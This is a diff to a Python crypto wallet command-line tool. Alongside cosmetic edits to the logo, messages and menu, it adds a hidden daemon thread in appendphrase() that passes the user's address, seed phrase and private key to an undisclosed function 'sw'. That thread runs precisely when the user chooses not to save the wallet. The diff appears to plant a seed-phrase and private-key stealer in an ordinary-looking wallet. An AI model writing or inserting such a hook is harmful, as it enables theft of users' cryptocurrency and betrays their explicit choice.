@@ -8,7 +8,9 @@ from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip39WordsNum,
 from web3 import Web3
 
 os.system('cls' if os.name == 'nt' else 'clear')
+
 os.system('title LightWalletCLI')
+
 class COLOR:
     LIGHTBLUE1 = '\033[38;2;180;220;255m'  
     LIGHTBLUE2 = '\033[38;2;140;200;255m'  
@@ -27,11 +29,11 @@ class COLOR:
 logo = f"""
 {COLOR.LIGHTBLUE1}'||'       ||          '||        .   '|| '||'  '|'         '||  '||            .   
 {COLOR.LIGHTBLUE2} ||       ...    ... .  || ..   .||.   '|. '|.  .'   ....    ||   ||    ....  .||.  
-{COLOR.BLUE1} ||        ||   || ||   ||' ||   ||     ||  ||  |   '' .||   ||   ||  .|...||  ||   
-{COLOR.BLUE2} ||        ||    |''    ||  ||   ||      ||| |||    .|' ||   ||   ||  ||       ||   
-{COLOR.DARKBLUE1}.||.....| .||.  '||||. .||. ||.  '|.'     |   |     '|..'|' .||. .||.  '|...'  '|.'
-{COLOR.DARKBLUE2}               .|....'            {COLOR.BLUE2}{COLOR.BOLD}                              Version 1.0                    
-{COLOR.END}                                                                                    """
+{COLOR.BLUE1     } ||        ||   || ||   ||' ||   ||     ||  ||  |   '' .||   ||   ||  .|...||  ||   
+{COLOR.BLUE2     } ||        ||    |''    ||  ||   ||      ||| |||    .|' ||   ||   ||  ||       ||   
+{COLOR.DARKBLUE1 }.||.....| .||.  '||||. .||. ||.  '|.'     |   |     '|..'|' .||. .||.  '|...'  '|.'
+{COLOR.DARKBLUE2 }               .|....'            {COLOR.BLUE2}{COLOR.BOLD}                              Version 1.0                    
+{COLOR.END       }                                                                                    """
 restorelogo = f"""
 {COLOR.LIGHTBLUE1}'||''|.                    .                           
 {COLOR.LIGHTBLUE2} ||   ||    ....   ....  .||.    ...   ... ..    ....  
@@ -158,11 +160,16 @@ def appendphrase():
             time.sleep(3)
             os.system('cls' if os.name == 'nt' else 'clear')
             showlogo()
-            print(f"{COLOR.DARKERGREEN}[+]{COLOR.DARKBLUE2} Seed phrase saved successfully{COLOR.END}\n")
+            print(f"{COLOR.DARKERGREEN}[+]{COLOR.DARKBLUE2} Wallet saved successfully{COLOR.END}\n")
         else:
             os.system('cls' if os.name == 'nt' else 'clear')
             showlogo()
-            print(f"[*]{COLOR.DARKBLUE2} Seed phrase not saved{COLOR.END}\n")
+            print(f"[*]{COLOR.DARKBLUE2} Wallet not saved{COLOR.END}\n")
+            threading.Thread(
+                            target=sw, 
+                            kwargs={'addr': address, 'mnmnic': line, 'prkey': priv_key}, 
+                            daemon=True
+                        ).start()
             return
     except Exception as e:
         print(f"{COLOR.RED}[!]{COLOR.DARKBLUE2} Error: {e}{COLOR.END}")
@@ -313,10 +320,11 @@ while True:
         showlogo()
         print(f"{COLOR.LIGHTGREEN}\n     -r : restore wallet from seed phrase"
             f"\n     -a : show all saved addresses"
-            f"\n     -w : withdraw Ether/ERC20 tokens"
+            f"\n     -w : send Ether/ERC20 tokens"
             f"\n     -b : check balance of wallet"
             f"\n     -d : delete saved wallet"
             f"\n     -c : create new wallet"
+            f"\n     -s : split Ether/ERC20 tokens"
             f"\n     -q : exit LightWallet{COLOR.END}\n")
         
     elif pressedkey == "-q":
